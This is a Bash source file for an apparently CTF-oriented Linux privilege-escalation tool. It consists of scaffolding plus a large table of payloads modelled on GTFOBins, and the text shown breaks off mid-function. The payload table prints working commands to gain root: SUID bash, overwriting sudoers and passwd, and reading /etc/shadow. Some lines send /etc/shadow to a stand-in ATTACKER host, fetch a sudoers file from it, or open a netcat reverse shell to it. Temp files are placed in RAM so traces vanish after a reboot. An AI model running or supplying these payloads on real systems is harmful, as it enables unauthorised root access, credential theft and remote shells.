#!/usr/bin/env bash
# =============================================================================
# APEX — Linux Privilege Escalation Reasoner
# =============================================================================
# Single-file Bash tool. Three engines, ten adaptive layers.
# Reference design files: 00_PRE_BUILD_QA.md through 13_CREDENTIAL_AND_SECRET_DETECTION.md
# Authoritative gap list: 11_GAPS_AND_CRITICAL_ISSUES.md
# =============================================================================
# PHASE 0 — Scaffold only. All functions are stubs that return 0.
# Gate: `bash apex.sh` runs without errors and prints "APEX scaffold ready".
# =============================================================================

# shellcheck disable=SC2034
# (Most Section 1 globals are intentional Phase-N placeholders — populated by
#  detection or engine functions added in later phases. The disable is scoped
#  to this file; per-function warnings are not affected.)

APEX_VERSION="0.0.2-phase2"
APEX_RELEASE_DATE="2026-05-15"

# Bail on undefined variable usage during scaffold testing.
# (pipefail / errexit deliberately NOT set — robustness layer handles failures.)
set -u

# =============================================================================
# SECTION 1 — Constants and Global State
# =============================================================================
# Every global is declared and initialized here. No function may use a global
# that has not been initialized in this section. Numeric vars default to 0,
# strings default to "" or "unknown" where a sentinel is meaningful.

# ── Runtime identity ────────────────────────────────────────────────────────
APEX_USER=""
APEX_UID=0
APEX_HOSTNAME=""
APEX_PWD=""

# ── Environment detection results (filled by detect_environment) ────────────
OS_ID="unknown"
OS_VERSION="unknown"
KERNEL="unknown"
ARCH="unknown"
INIT="unknown"
PKG="none"

# ── Capability detection (filled by detect_environment) ─────────────────────
HAS_BASH=0
HAS_ASSOCIATIVE_ARRAYS=0
HAS_GETCAP=0
HAS_STRINGS=0
HAS_LDD=0
HAS_DEBSUMS=0
HAS_RPMV=0
HAS_BUSCTL=0
HAS_PYTHON3=0
HAS_PYTHON2=0
HAS_PERL=0
HAS_STRACE=0
HAS_LSATTR=0
HAS_READELF=0
HAS_EXPECT=0
HAS_INOTIFYWAIT=0
HAS_RUBY=0
HAS_NODE=0
HAS_LUA=0
HAS_GCC=0
HAS_CC=0
TIMEOUT_CMD="none"
NET_TOOL="none"
FIND_HAS_WRITABLE=0
STAT_GNU=0

# ── Security layer detection (filled by detect_security_layers) ─────────────
SELINUX_STATUS="unknown"
APPARMOR_STATUS="unknown"
SECCOMP_STATUS="unknown"

# ── Container detection (filled by detect_container) ────────────────────────
IS_CONTAINER=0
CONTAINER_TYPE="none"

# ── Resource detection (filled by detect_resources) ─────────────────────────
MEM_KB=0
FORK_LIMIT=0
DISK_FREE_KB=0

# ── Execution primitives (filled by detect_execution_primitives) ────────────
EXEC_DIR=""
EXEC_METHOD="none"
RESTRICTED=0
RESTRICTED_REASONS=""
SHELL_NAME=""
SHELL_PATH=""

# ── Temp / working directories ──────────────────────────────────────────────
APEX_TMP=""
APEX_FINDINGS_DIR=""
APEX_LOG=""
APEX_TEMPFILES=""

# ── Deep reader state (CRITICAL: reset between top-level targets) ───────────
READER_VISITED=""
READER_DEPTH=0
READER_MAX_DEPTH=5
READER_START_TIME=0
READER_MAX_TIME=60

# ── Run-mode flags (set by parse_args) ──────────────────────────────────────
APEX_MODE="normal"        # normal | full | test | quick | layer1-only
APEX_VERBOSE=0
APEX_DEBUG=0
APEX_NO_COLOR=0
APEX_LAYER_LIMIT=10
APEX_BUDGET_SECONDS=90

# ── Shell detection + terminal color capability ─────────────────────────────
APEX_SHELL="sh"
APEX_SHELL_COLOR=0   # 0=none, 1=basic-8, 2=full-256+bold
_c_reset="" _c_bold="" _c_dim=""
_c_red="" _c_green="" _c_yellow="" _c_cyan="" _c_blue="" _c_magenta=""
_c_bred="" _c_bgreen="" _c_byellow="" _c_bcyan=""

apex_detect_shell() {
    # Identify running shell — used for color capability and exploit shebang choice
    if [ -n "${BASH_VERSION:-}" ]; then
        APEX_SHELL="bash"
    elif [ -n "${ZSH_VERSION:-}" ]; then
        APEX_SHELL="zsh"
    elif [ -n "${KSH_VERSION:-}" ]; then
        APEX_SHELL="ksh"
    else
        local _sname
        _sname=$(cat /proc/$$/comm 2>/dev/null || \
                 readlink /proc/$$/exe 2>/dev/null | xargs basename 2>/dev/null || \
                 printf 'sh')
        APEX_SHELL="${_sname:-sh}"
    fi

    # Color capability based on shell + TERM + isatty
    [ "$APEX_NO_COLOR" = "1" ] && return 0
    # No colors if stdout is not a terminal (piped to file/grep/etc)
    [ -t 1 ] || return 0

    case "$APEX_SHELL" in
        bash|zsh|ksh|fish)
            # Full color — 256-color + bold supported
            APEX_SHELL_COLOR=2
            _c_reset=$'\033[0m'
            _c_bold=$'\033[1m'
            _c_dim=$'\033[2m'
            _c_red=$'\033[0;31m'
            _c_green=$'\033[0;32m'
            _c_yellow=$'\033[0;33m'
            _c_cyan=$'\033[0;36m'
            _c_blue=$'\033[0;34m'
            _c_magenta=$'\033[0;35m'
            _c_bred=$'\033[1;31m'
            _c_bgreen=$'\033[1;32m'
            _c_byellow=$'\033[1;33m'
            _c_bcyan=$'\033[1;36m'
            ;;
        dash|ash|busybox*)
            # Basic 8-color ANSI — no bold/italic (some terminals render wrong)
            APEX_SHELL_COLOR=1
            _c_reset=$'\033[0m'
            _c_bold=$'\033[1m'
            _c_red=$'\033[31m'
            _c_green=$'\033[32m'
            _c_yellow=$'\033[33m'
            _c_cyan=$'\033[36m'
            _c_blue=$'\033[34m'
            _c_magenta=$'\033[35m'
            _c_bred=$'\033[31m'
            _c_bgreen=$'\033[32m'
            _c_byellow=$'\033[33m'
            _c_bcyan=$'\033[36m'
            ;;
        *)
            # Unknown shell — try basic if TERM is set and not dumb
            case "${TERM:-}" in
                dumb|"") APEX_SHELL_COLOR=0 ;;
                *)
                    APEX_SHELL_COLOR=1
                    _c_reset=$'\033[0m'
                    _c_red=$'\033[31m'; _c_green=$'\033[32m'
                    _c_yellow=$'\033[33m'; _c_cyan=$'\033[36m'
                    _c_bred=$'\033[31m'; _c_bgreen=$'\033[32m'
                    _c_byellow=$'\033[33m'; _c_bcyan=$'\033[36m'
                    ;;
            esac
            ;;
    esac
    return 0
}

# ── Engine progress flags ───────────────────────────────────────────────────
ENGINE1_DONE=0
ENGINE2_DONE=0
ENGINE3_DONE=0

# ── Layer activation flags ──────────────────────────────────────────────────
LAYER_ACTIVE=0
LAYER_LAST_CONFIRMED=0

# ── Counters ────────────────────────────────────────────────────────────────
FINDINGS_TOTAL=0
FINDINGS_CONFIRMED=0
FINDINGS_HIGH=0

# ── Enhancement globals (D2 — origin detection + tool delivery) ─────────────
APEX_ORIGIN_BASE=""
APEX_EXEC_DIR=""
APEX_AUTHKEYS_OVERRIDE=""

# GAP 2 — background pspy state. Set by apex_pspy_bg_start, consumed by
# apex_pspy_bg_wait_and_parse. When PID is set, layer_6_dynamic skips its
# own pspy run to avoid duplicate work.
APEX_PSPY_BG_PID=""
APEX_PSPY_BG_OUT=""


# =============================================================================
# SECTION 2 — Compatibility Wrappers
# =============================================================================
# Every external-tool call in APEX goes through one of these wrappers. They
# encapsulate GNU vs BSD vs BusyBox differences and provide a fallback chain.

# ─── apex_find ──────────────────────────────────────────────────────────────
# Wraps find with hard-coded prunes for virtual filesystems (/proc /sys /dev
# /run) — find never descends into them, so /proc/self/mem and similar
# infinite/blocking paths cannot hang the scan.
#
# Usage:  apex_find <root> [find-test-expression...]
#
# The caller's expression must be tests only (-name, -type, -perm, -newer,
# -user, -group, etc.) — NOT actions. apex_find adds -print itself.
#
# Stderr is suppressed (permission denied messages on every Linux box would
# overwhelm output). Caller may pipe stdout into head/awk/etc.
apex_find() {
    local root="${1:-/}"
    [ "$#" -ge 1 ] && shift

    find "$root" \
        \( -path /proc -o -path /sys -o -path /dev -o -path /run \) -prune -o \
        \( -true "$@" \) -print 2>/dev/null
}
# ─── apex_stat ──────────────────────────────────────────────────────────────
# Cross-platform stat. GNU stat (-c) first, BSD stat (-f) next, ls last.
# Usage:  apex_stat <file> <field>
# Fields: owner | group | perms | size | mtime
# Prints the requested field on stdout, empty on failure.
apex_stat() {
    local file="$1"
    local field="${2:-owner}"
    [ -z "$file" ] && return 0
    [ -e "$file" ] || return 0

    case "$field" in
        owner)
            stat -c '%U' -- "$file" 2>/dev/null \
                || stat -f '%Su' -- "$file" 2>/dev/null \
                || ls -ldn -- "$file" 2>/dev/null | awk '{print $3; exit}'
            ;;
        group)
            stat -c '%G' -- "$file" 2>/dev/null \
                || stat -f '%Sg' -- "$file" 2>/dev/null \
                || ls -ldn -- "$file" 2>/dev/null | awk '{print $4; exit}'
            ;;
        perms)
            stat -c '%a' -- "$file" 2>/dev/null \
                || stat -f '%Lp' -- "$file" 2>/dev/null
            ;;
        size)
            stat -c '%s' -- "$file" 2>/dev/null \
                || stat -f '%z' -- "$file" 2>/dev/null \
                || wc -c <"$file" 2>/dev/null | awk '{print $1}'
            ;;
        mtime)
            stat -c '%Y' -- "$file" 2>/dev/null \
                || stat -f '%m' -- "$file" 2>/dev/null
            ;;
        *)
            return 0
            ;;
    esac
    return 0
}

# ─── apex_lsattr ────────────────────────────────────────────────────────────
# Reads the chattr/lsattr attribute string for a path. Returns empty when
# lsattr is unavailable OR when the file is on a filesystem that does not
# support extended attributes (tmpfs, NFS, etc.) — callers MUST treat empty
# as "unknown", not "no flags set".
apex_lsattr() {
    local file="$1"
    [ -z "$file" ] && return 0
    [ -e "$file" ] || return 0
    command -v lsattr >/dev/null 2>&1 || return 0

    safe_run 3 lsattr -d -- "$file" | awk 'NR==1{print $1}'
    return 0
}

# ─── apex_getcaps ───────────────────────────────────────────────────────────
# Returns file or process capabilities. With a path argument, getcap on that
# file (file capabilities). Without args, getcap -r / OR /proc/*/status
# fallback (process capabilities — informational, not file caps).
apex_getcaps() {
    local target="${1:-}"

    if [ -n "$target" ]; then
        if command -v getcap >/dev/null 2>&1; then
            safe_run 5 getcap -- "$target"
        fi
        return 0
    fi

    if command -v getcap >/dev/null 2>&1; then
        safe_run 15 getcap -r /
        return 0
    fi

    # Fallback: scan /proc/*/status for non-zero CapEff values.
    # NOTE: this lists PROCESS capabilities, not file capabilities. Callers
    # of map_capabilities() must annotate findings accordingly.
    local status_file pid cap_eff exe
    for status_file in /proc/[0-9]*/status; do
        [ -r "$status_file" ] || continue
        pid="${status_file#/proc/}"
        pid="${pid%/status}"
        cap_eff=$(awk '/^CapEff:/{print $2; exit}' "$status_file" 2>/dev/null)
        [ -z "$cap_eff" ] && continue
        [ "$cap_eff" = "0000000000000000" ] && continue
        exe=$(readlink "/proc/$pid/exe" 2>/dev/null)
        [ -n "$exe" ] && printf '%s pid=%s capeff=0x%s\n' "$exe" "$pid" "$cap_eff"
    done
    return 0
}

# ─── apex_strings ───────────────────────────────────────────────────────────
# Extracts printable strings (length >= 4) from a binary file.
# Path 1: GNU strings (binutils) — fast, rich
# Path 2: python3 inline regex on bytes — universal where python3 exists
# Path 3: returns empty (callers must tolerate missing strings output)
apex_strings() {
    local file="$1"
    [ -z "$file" ] && return 0
    [ -r "$file" ] || return 0

    if command -v strings >/dev/null 2>&1; then
        safe_run 15 strings -a -- "$file"
        return 0
    fi

    if command -v python3 >/dev/null 2>&1; then
        safe_run 15 python3 -c '
import sys, re
with open(sys.argv[1], "rb") as f:
    data = f.read()
for m in re.findall(rb"[\x20-\x7e]{4,}", data):
    sys.stdout.buffer.write(m + b"\n")
' "$file"
        return 0
    fi

    return 0
}

# ─── apex_readelf ───────────────────────────────────────────────────────────
# Reads ELF dynamic section (RPATH / RUNPATH / NEEDED). Stub for Phase 2.
apex_readelf()           { return 0; }

# ─── apex_regex_match ───────────────────────────────────────────────────────
# POSIX-portable regex match. Uses bash [[ =~ ]] when available, grep -qE otherwise.
apex_regex_match() {
    local string="${1:-}" pattern="${2:-}"
    [ -z "$pattern" ] && return 1
    if [ "${HAS_BASH:-0}" = "1" ]; then
        [[ "$string" =~ $pattern ]]
        return $?
    fi
    printf '%s' "$string" | grep -qE -- "$pattern"
}


# =============================================================================
# SECTION 3 — Robustness Layer (safe_run, verify, log, trap)
# =============================================================================
# CRITICAL-1: safe_run() MUST take args as ARRAY, not as STRING. Real signature
# in Phase 1: safe_run <timeout_sec> <cmd> [args...]. No double-interpretation.
# CRITICAL-6: verify_actually_writable() includes lsattr immutable-flag check.

# ─── safe_run ───────────────────────────────────────────────────────────────
# CRITICAL-1: array args, NEVER `bash -c "$cmd"`. Caller passes the timeout
# in seconds followed by the command and its arguments as separate words.
#
#   safe_run 5 sudo -n -l
#   safe_run 15 strings -a /usr/bin/foo
#
# Always closes stdin (kills interactive prompts), always swallows stderr,
# always returns 0 to the parent. Captured stdout is printed verbatim.
#
# Self-bootstraps TIMEOUT_CMD on first call so it works even before
# detect_environment() has populated globals.
safe_run() {
    local timeout_sec="${1:-10}"
    [ "$#" -ge 1 ] && shift
    [ "$#" -eq 0 ] && return 0

    if [ "$TIMEOUT_CMD" = "none" ]; then
        if command -v timeout >/dev/null 2>&1; then
            TIMEOUT_CMD="timeout"
        elif command -v busybox >/dev/null 2>&1 && busybox timeout -t 1 true >/dev/null 2>&1; then
            TIMEOUT_CMD="busybox-timeout"
        elif command -v busybox >/dev/null 2>&1 && busybox timeout 1 true >/dev/null 2>&1; then
            TIMEOUT_CMD="busybox-timeout-modern"
        fi
    fi

    # CRITICAL: external `timeout` cannot invoke shell functions (apex_find,
    # apex_strings, etc.) — `timeout` fails with "No such file" and the caller
    # silently gets an empty result. Detect shell functions and force the
    # in-shell watchdog path so they remain callable.
    local _mode="$TIMEOUT_CMD"
    case "$(type -t "$1" 2>/dev/null)" in
        function) _mode="none" ;;
    esac

    case "$_mode" in
        timeout)
            timeout "$timeout_sec" "$@" </dev/null 2>/dev/null
            return 0
            ;;
        busybox-timeout)
            busybox timeout -t "$timeout_sec" "$@" </dev/null 2>/dev/null
            return 0
            ;;
        busybox-timeout-modern)
            busybox timeout "$timeout_sec" "$@" </dev/null 2>/dev/null
            return 0
            ;;
        none|*)
            # No timeout binary — background process + watchdog kill.
            local tmpdir tmpfile bg_pid killer
            if [ -n "$APEX_TMP" ] && [ -d "$APEX_TMP" ]; then
                tmpdir="$APEX_TMP"
            else
                tmpdir="${TMPDIR:-/tmp}"
            fi
            tmpfile=$(mktemp "${tmpdir}/.apex_safe_XXXXXX" 2>/dev/null) || return 0

            "$@" </dev/null >"$tmpfile" 2>/dev/null &
            bg_pid=$!
            (
                sleep "$timeout_sec"
                kill -TERM "$bg_pid" 2>/dev/null
                sleep 1
                kill -KILL "$bg_pid" 2>/dev/null
            ) >/dev/null 2>&1 &
            killer=$!
            wait "$bg_pid" 2>/dev/null
            kill -TERM "$killer" 2>/dev/null
            wait "$killer" 2>/dev/null
            cat "$tmpfile" 2>/dev/null
            rm -f "$tmpfile" 2>/dev/null
            return 0
            ;;
    esac
}

# ─── verify_actually_writable ───────────────────────────────────────────────
# CRITICAL-6: `find -writable` and `[ -w ]` only check permission bits — they
# miss the chattr +i (immutable) flag, ACL deny entries, and read-only mounts.
# Used as the last gate before EVERY write-based finding gets a high score.
#
# Returns 0 if the path can actually be written, 1 otherwise.
#
# For files: creates a sibling test file alongside (so the original is never
#            modified). Requires the PARENT DIR to be writable too — which is
#            the conservative side of the false-positive trade.
# For dirs:  touches a dotfile inside, deletes it.
verify_actually_writable() {
    local path="${1:-}"
    [ -z "$path" ] && return 1
    [ -e "$path" ] || return 1

    # Layer 1 — kernel permission check
    [ -w "$path" ] || return 1

    # Layer 2 — lsattr immutable flag (the maker-trap defense)
    if command -v lsattr >/dev/null 2>&1; then
        local attrs
        attrs=$(apex_lsattr "$path")
        case "$attrs" in
            *i*) return 1 ;;  # +i immutable: chattr trap detected
            *a*) return 1 ;;  # +a append-only: cannot rewrite content
        esac
    fi

    # Layer 3 — actual write attempt
    local testname
    if [ -d "$path" ]; then
        testname="${path%/}/.apex_wrtest_$$_${RANDOM:-0}"
        if (umask 077; : >"$testname") 2>/dev/null; then
            rm -f -- "$testname" 2>/dev/null
            return 0
        fi
        return 1
    fi

    # Regular file: sibling probe (never touches the target itself).
    testname="${path}.apex_wrtest_$$_${RANDOM:-0}"
    if (umask 077; : >"$testname") 2>/dev/null; then
        rm -f -- "$testname" 2>/dev/null
        return 0
    fi
    return 1
}
# ─── _is_pkg_owned (B2) ─────────────────────────────────────────────────────
# Returns 0 if a binary belongs to a distro package (dpkg / rpm / apk / pkg).
# Used to demote SUID_CUSTOM / SUID_STRINGS_RELATIVE confidence for stock
# binaries living in /usr/bin /usr/sbin /bin /sbin — CTF privesc chains
# almost always live in /usr/local/, /opt/, /home/, /srv/ instead.
#
# Results are cached in APEX_PKG_CACHE (one-call-per-path).
APEX_PKG_CACHE="${APEX_PKG_CACHE:-}"

_is_pkg_owned() {
    local path="${1:-}"
    [ -z "$path" ] && return 1
    [ -e "$path" ] || return 1
    # Cache hit?
    case " $APEX_PKG_CACHE " in
        *" Y:$path "*) return 0 ;;
        *" N:$path "*) return 1 ;;
    esac
    local rv=1
    if command -v dpkg-query >/dev/null 2>&1; then
        if safe_run 3 dpkg-query -S "$path" >/dev/null 2>&1; then rv=0; fi
    elif command -v dpkg >/dev/null 2>&1; then
        if safe_run 3 dpkg -S "$path" >/dev/null 2>&1; then rv=0; fi
    elif command -v rpm >/dev/null 2>&1; then
        if safe_run 3 rpm -qf "$path" >/dev/null 2>&1; then rv=0; fi
    elif command -v apk >/dev/null 2>&1; then
        if safe_run 3 apk info -W "$path" >/dev/null 2>&1; then rv=0; fi
    elif command -v pkg >/dev/null 2>&1; then
        if safe_run 3 pkg which "$path" >/dev/null 2>&1; then rv=0; fi
    fi
    if [ "$rv" = "0" ]; then
        APEX_PKG_CACHE="$APEX_PKG_CACHE Y:$path"
    else
        APEX_PKG_CACHE="$APEX_PKG_CACHE N:$path"
    fi
    return "$rv"
}

_in_custom_path() {
    # Returns 0 if path is under a "custom" tree (CTF privesc lives here).
    case "${1:-}" in
        /usr/local/*|/opt/*|/home/*|/srv/*|/tmp/*|/var/tmp/*|/root/*) return 0 ;;
        *) return 1 ;;
    esac
}

# ─── _gtfo_payload ──────────────────────────────────────────────────────────
# GTFOBins payload table for sudo / SUID / capability invocation.
# Args: BINARY_BASENAME MODE [FULL_PATH]
#   MODE: sudo | suid | cap
# Prints exact exploit body to stdout. Empty output = no known payload.
# Curated from gtfobins.github.io plus the BankSmarter machine catalogue
# (sudoDecoder + SUID examples in HS/Banksmarter/index.html).
_gtfo_payload() {
    local b="${1:-}" mode="${2:-sudo}" full="${3:-}"
    [ -z "$b" ] && return 0
    local pre="" suf=""
    case "$mode" in
        sudo) pre="sudo -n " ;;
        suid) pre="" ;;
        cap)  pre="" ;;
    esac
    case "$b" in
        bash|sh|dash|zsh|ash|ksh)
            [ "$mode" = "suid" ] && printf '%s -p\n' "$b" || printf '%s%s\n' "$pre" "$b" ;;
        vim|vi)
            printf "%s%s -c ':!/bin/bash -p'\n" "$pre" "$b" ;;
        nvim)
            printf "%s%s -c ':!/bin/bash -p'\n" "$pre" "$b" ;;
        nano|pico)
            printf "%s%s\n# inside: Ctrl+R, Ctrl+X, then: reset; bash 1>&0 2>&0\n" "$pre" "$b" ;;
        ed)
            printf "%s%s\n# inside: !/bin/bash -p\n" "$pre" "$b" ;;
        emacs)
            printf "%s%s -Q -nw --eval '(term \"/bin/bash -p\")'\n" "$pre" "$b" ;;
        less|more|most|pg)
            printf "%s%s /etc/profile\n# inside: !bash\n" "$pre" "$b" ;;
        man)
            printf "%s%s man\n# inside: !bash\n" "$pre" "$b" ;;
        awk|gawk|mawk)
            printf "%s%s 'BEGIN {system(\"/bin/bash -p\")}'\n" "$pre" "$b" ;;
        find)
            printf "%s%s . -exec /bin/bash -p \\; -quit\n" "$pre" "$b" ;;
        nmap)
            printf "%s%s --interactive\n# inside: !sh\n# OR (newer): echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse; %s%s --script=/tmp/x.nse\n" "$pre" "$b" "$pre" "$b" ;;
        python|python3|python2)
            if [ "$mode" = "cap" ]; then
                printf "%s -c 'import os;os.setuid(0);os.execl(\"/bin/bash\",\"bash\",\"-p\")'\n" "$b"
            elif [ "$mode" = "suid" ]; then
                printf "%s -c 'import os;os.execl(\"/bin/bash\",\"bash\",\"-p\")'\n" "$b"
            else
                printf "%s%s -c 'import os;os.system(\"/bin/bash\")'\n" "$pre" "$b"
            fi ;;
        perl)
            if [ "$mode" = "cap" ]; then
                printf "%s -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'\n" "$b"
            else
                printf "%s%s -e 'exec \"/bin/bash\";'\n" "$pre" "$b"
            fi ;;
        ruby)
            printf "%s%s -e 'exec \"/bin/bash\"'\n" "$pre" "$b" ;;
        node|nodejs)
            printf "%s%s -e 'require(\"child_process\").execSync(\"/bin/bash\",{stdio:[0,1,2]})'\n" "$pre" "$b" ;;
        lua)
            printf "%s%s -e 'os.execute(\"/bin/bash\")'\n" "$pre" "$b" ;;
        php)
            printf "%s%s -r 'pcntl_exec(\"/bin/bash\");'\n" "$pre" "$b" ;;
        tar|bsdtar)
            printf "%s%s -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash\n" "$pre" "$b" ;;
        zip)
            printf "%sTF=$(mktemp); %s$%s $TF /etc/hostname -T --unzip-command='sh -c /bin/bash'\n" "" "$pre" "$b" ;;
        rsync)
            printf "%s%s -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null /dev/null\n" "$pre" "$b" ;;
        ssh)
            printf "%s%s -o ProxyCommand=';sh 0<&2 1>&2' x\n" "$pre" "$b" ;;
        scp)
            printf "%s%s -S /bin/bash x y:\n" "$pre" "$b" ;;
        wget|curl)
            if [ "$b" = "wget" ]; then
                printf "# READ:  %s%s -O- file:///etc/shadow\n# WRITE: %s%s -O /etc/sudoers http://ATTACKER/sudoers\n" "$pre" "$b" "$pre" "$b"
            else
                printf "# READ:  %s%s file:///etc/shadow\n# WRITE: %s%s --upload-file /etc/shadow http://ATTACKER:8000/\n" "$pre" "$b" "$pre" "$b"
            fi ;;
        nginx)
            printf "%s%s -c /tmp/n.conf\n# /tmp/n.conf body: events{} http{server{listen 8081;root /;dav_methods PUT;client_max_body_size 999M;}}\n" "$pre" "$b" ;;
        systemctl)
            printf "TF=$(mktemp).service; printf '[Service]\\nType=oneshot\\nExecStart=/bin/sh -c \"chmod u+s /bin/bash\"\\n[Install]\\nWantedBy=multi-user.target\\n' > $TF\n%s%s link $TF\n%s%s enable --now $(basename $TF .service)\n/bin/bash -p\n" "$pre" "$b" "$pre" "$b" ;;
        cp)
            printf "# write SSH key:  %s%s ~/.ssh/id_rsa.pub /root/.ssh/authorized_keys\n# overwrite passwd: echo 'r:x:0:0::/:/bin/bash' >> /tmp/p; %s%s /tmp/p /etc/passwd\n" "$pre" "$b" "$pre" "$b" ;;
        mv)
            printf "# overwrite shadow: cp /etc/shadow /tmp/s; (edit /tmp/s); %s%s /tmp/s /etc/shadow\n" "$pre" "$b" ;;
        dd)
            printf "# write authorized_keys: echo PUB | %s%s of=/root/.ssh/authorized_keys\n" "$pre" "$b" ;;
        tee)
            printf "echo 'attacker ALL=(ALL) NOPASSWD: ALL' | %s%s -a /etc/sudoers\n" "$pre" "$b" ;;
        env)
            printf "%s%s /bin/bash -p\n" "$pre" "$b" ;;
        gdb)
            printf "%s%s -nx -ex 'python import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")' -ex quit\n" "$pre" "$b" ;;
        socat)
            printf "%s%s STDIN EXEC:/bin/bash,setsid,pty,stderr\n" "$pre" "$b" ;;
        nc|ncat|netcat)
            printf "# bind: %s%s -e /bin/bash -lvp 4444\n# rev:  %s%s ATTACKER 4444 -e /bin/bash\n" "$pre" "$b" "$pre" "$b" ;;
        xxd|hexdump)
            printf "%s%s /etc/shadow | head\n" "$pre" "$b" ;;
        cat|head|tail|sort|uniq|cut|paste)
            printf "%s%s /etc/shadow\n" "$pre" "$b" ;;
        chmod)
            printf "%s%s u+s /bin/bash; /bin/bash -p\n" "$pre" "$b" ;;
        chown)
            printf "%s%s $(id -un):$(id -un) /etc/shadow; cat /etc/shadow\n" "$pre" "$b" ;;
        7z|7za|7zr)
            printf "TF=$(mktemp -d); ln -s /etc/shadow $TF/x; %s%s a -tzip /tmp/o.zip /etc/shadow 2>&1 | head\n# OR wildcard: cd /writable; touch -- '@x'; %s%s a -tzip /tmp/o.zip * x\n" "$pre" "$b" "$pre" "$b" ;;
        dosbox)
            printf "%s%s -c 'mount c /' -c 'c:' -c 'echo www-data ALL=(ALL) NOPASSWD: ALL >> etc/sudoers' -c exit\n" "$pre" "$b" ;;
        docker)
            printf "%s%s run -v /:/mnt --rm -it alpine chroot /mnt sh\n" "$pre" "$b" ;;
        lxc|lxd)
            printf "lxc image import alpine.tar.gz --alias pwn 2>/dev/null\n%s%s init pwn p -c security.privileged=true\n%s%s config device add p host disk source=/ path=/mnt/host recursive=true\n%s%s start p && %s%s exec p sh\n" "$pre" "$b" "$pre" "$b" "$pre" "$b" "$pre" "$b" ;;
        debugfs)
            printf "%s%s /dev/sda1 -R 'cat /etc/shadow'\n" "$pre" "$b" ;;
        mount)
            printf "%s%s -o bind /bin/bash /etc/cron.daily/.placeholder 2>/dev/null  # situational\n" "$pre" "$b" ;;
        umount)
            printf "%s%s /etc 2>&1 | head  # may bypass MAC\n" "$pre" "$b" ;;
        apt|apt-get)
            printf "%s%s update -o APT::Update::Pre-Invoke::='/bin/bash -p'\n" "$pre" "$b" ;;
        unzip)
            printf "%s%s -o evil.zip -d /etc/  # overwrite shadow if zip contains shadow\n" "$pre" "$b" ;;
        git)
            printf "%s%s -p help # inside !bash, OR if no PAGER: %s%s --help\n" "$pre" "$b" "$pre" "$b" ;;
        ftp)
            printf "%s%s\n# inside: !/bin/bash\n" "$pre" "$b" ;;
        sftp)
            printf "%s%s -o ProxyCommand=';sh 0<&2 1>&2' x@127.0.0.1\n" "$pre" "$b" ;;
        ansible-playbook|ansible)
            printf "TF=$(mktemp); printf -- '- hosts: localhost\\n  tasks: [{shell: /bin/bash}]\\n' > $TF\n%sansible-playbook -c local -i 127.0.0.1, $TF\n" "$pre" ;;
        make)
            printf "COMMAND='/bin/bash' %s%s -s --eval=$'x:\\n\\t-'\"\\$COMMAND\"\n" "$pre" "$b" ;;
        knife|chef-solo)
            printf "%s%s exec -E 'exec \"/bin/bash\"'\n" "$pre" "$b" ;;
        passpy|pass)
            printf "%s%s show ../../../etc/shadow  # if path traversal works\n# OR: %s%s edit foo  # then editor escape (set EDITOR=vim)\n" "$pre" "$b" "$pre" "$b" ;;
        binwalk)
            printf "# CVE-2022-4510 (binwalk < 2.3.4): craft malicious PFS image then\n%s%s -e malicious.bin\n" "$pre" "$b" ;;
        exiftool)
            printf "# CVE-2021-22204 (exiftool < 12.24): craft DjVu polyglot then\n%s%s polyglot.jpg\n" "$pre" "$b" ;;
        chkrootkit)
            printf "# CVE-2014-0476: place payload at /tmp/update (mode +x) — chkrootkit runs it as root\n" ;;
        *)
            return 1 ;;
    esac
    return 0
}

# ─── setup_apex_tmp ─────────────────────────────────────────────────────────
# MEDIUM-1: private 0700 directory prevents symlink races on our own temp
# files. Tries RAM-backed locations first (/dev/shm) so traces don't survive
# reboot, then disk fallbacks.
#
# Sets globals:  APEX_TMP, APEX_FINDINGS_DIR, APEX_LOG
# Returns 0 on success, 1 if no writable location found.
setup_apex_tmp() {
    [ -n "$APEX_TMP" ] && [ -d "$APEX_TMP" ] && return 0   # already set up

    local base
    for base in /dev/shm /tmp /var/tmp; do
        [ -d "$base" ] && [ -w "$base" ] || continue
        APEX_TMP=$(mktemp -d "${base}/.apex_XXXXXX" 2>/dev/null) && break
        APEX_TMP=""
    done

    if [ -z "$APEX_TMP" ] || [ ! -d "$APEX_TMP" ]; then
        # Last resort: $HOME (no symlink race protection)
        APEX_TMP="${HOME:-/tmp}/.apex_$$_${RANDOM:-0}"
        mkdir -p "$APEX_TMP" 2>/dev/null || { APEX_TMP=""; return 1; }
    fi

    chmod 700 "$APEX_TMP" 2>/dev/null

    APEX_FINDINGS_DIR="${APEX_TMP}/findings"
    mkdir -p "$APEX_FINDINGS_DIR" 2>/dev/null
    chmod 700 "$APEX_FINDINGS_DIR" 2>/dev/null

    APEX_LOG="${APEX_TMP}/apex.log"
    : >"$APEX_LOG" 2>/dev/null
    return 0
}

# ─── register_tempfile ──────────────────────────────────────────────────────
# Track an external tempfile (one created outside APEX_TMP) so cleanup_apex
# can sweep it on exit. Most call sites should just use APEX_TMP instead.
register_tempfile() {
    local path="${1:-}"
    [ -z "$path" ] && return 0
    APEX_TEMPFILES="${APEX_TEMPFILES}${path}
"
    return 0
}

apex_detect_origin() {
    # Robust origin detection. Three sources are checked in order:
    #   1. APEX_ORIGIN env override (operator forced).
    #   2. Ancestor chain  ($$, $PPID, grandparent, great-grandparent).
    #   3. Siblings via parent PGID / our session  — required for the
    #      `bash <(curl URL)` invocation pattern, in which curl is a sibling
    #      of our bash (not an ancestor), so the ancestor walk misses it.
    if [ -n "${APEX_ORIGIN:-}" ]; then
        APEX_ORIGIN_BASE="${APEX_ORIGIN%/}"
        APEX_ORIGIN_BASE="${APEX_ORIGIN_BASE%/apex.sh}"
        return 0
    fi
    local pid_list="$$ $PPID"
    local gp gp2
    gp=$(awk '/^PPid:/{print $2}' /proc/$PPID/status 2>/dev/null)
    [ -n "$gp" ] && pid_list="$pid_list $gp"
    [ -n "$gp" ] && gp2=$(awk '/^PPid:/{print $2}' "/proc/$gp/status" 2>/dev/null)
    [ -n "$gp2" ] && pid_list="$pid_list $gp2"

    _origin_extract() {
        local _cmd="$1"
        printf '%s' "$_cmd" | grep -oE 'https?://[][:alnum:]:._@/%~?&=#+-]+' | \
            grep -iE 'apex|tools|cve|pspy|linpeas|lse|linenum|les\.sh' | head -1
    }
    local pid cmdline url
    for pid in $pid_list; do
